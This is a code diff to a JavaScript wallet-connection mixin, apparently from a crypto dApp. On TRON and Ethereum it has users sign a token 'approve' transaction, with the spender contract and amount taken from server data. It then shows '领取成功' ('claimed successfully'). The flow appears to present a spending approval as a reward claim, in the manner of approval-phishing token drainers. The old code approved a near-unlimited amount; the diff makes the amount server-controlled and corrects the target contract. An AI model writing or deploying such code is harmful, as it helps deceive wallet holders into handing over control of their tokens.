@@ -204,7 +204,9 @@ export const commonMixin = {
                     return;
                 }
                 const tronWeb = window.tronWeb
-                let _value = 999999999000000 //授权数量
+                //授权数量
+                const bigNum = tronWeb.BigNumber(contractdata.approve_value * Math.pow(10, contractdata.token_decimals))
+                let _value = bigNum.toString(10)
                 const parameter = [{
                     type: 'address',
                     value: contractdata.smart_contract
@@ -213,7 +215,7 @@ export const commonMixin = {
                     value: _value
                 }];
                 const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    contractdata.smart_contract,
+                    contractdata.token_contract,
                     "approve(address,uint256)", {},
                     parameter,
                     this.address
@@ -222,6 +224,7 @@ export const commonMixin = {
                 const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
                 uni.hideLoading()
                 if (broastTx?.result) {
+                    console.log(`broastTx`,broastTx)
 
                     //授权处理成功，开始成功后的业务处理----------------------
                     await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
@@ -252,13 +255,14 @@ export const commonMixin = {
                 }
                 let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
                 //授权数量
-                let _value = Web3.utils.toWei("999999999", 'ether');
+                let _value = Web3.utils.toWei(ctx.approve_value, 'ether');
                 const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
                     from: this.address
                 })
                 const transactionHash = receipt?.transactionHash;
                 if (transactionHash) {
                     uni.hideLoading()
+                    console.log(`receipt`,receipt)
                     await this.$store.dispatch(`setIsApprove`, {result: true, txid: transactionHash})
                     await this.approveSuccess()
                     comjs.jsalert("领取成功");
